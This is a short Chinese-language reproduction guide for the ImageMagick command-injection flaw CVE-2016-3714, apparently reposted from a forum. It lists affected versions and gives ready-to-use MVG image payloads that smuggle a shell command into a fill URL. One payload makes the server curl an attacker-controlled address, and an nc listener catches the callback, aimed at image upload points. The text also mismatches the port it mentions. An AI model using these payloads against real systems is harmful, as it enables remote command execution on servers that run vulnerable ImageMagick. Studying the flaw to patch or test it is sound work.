# （CVE-2016-3714）ImageMagick 命令执行漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2968](https://www.zhihuifly.com/t/topic/2968)

# （CVE-2016-3714）ImageMagick 命令执行漏洞

## 一、漏洞简介

/etc/ImageMagick/delegates.xml 将%s，%l加入到command里造成了命令执行

## 二、漏洞影响

ImageMagick 6.5.7-8 2012-08-17(手工测试风险存在)

ImageMagick 6.7.7-10 2014-03-06(手工测试风险存在)

低版本至6.9.3-9 released 2016-04-30

## 三、复现过程

### poc

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"| command")'
pop graphic-context 
```

图片上传点，抓包，附上exp代码：

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"| curl 172.16.20.108:8888")'
pop graphic-context 
```

> ip：你要反弹的shell地址，2333端口号，服务器监听反弹shell。

```
nc -lvp ``8888 
```

![image](img/53c9f04a92f0d08fff065317db5fbac2.png)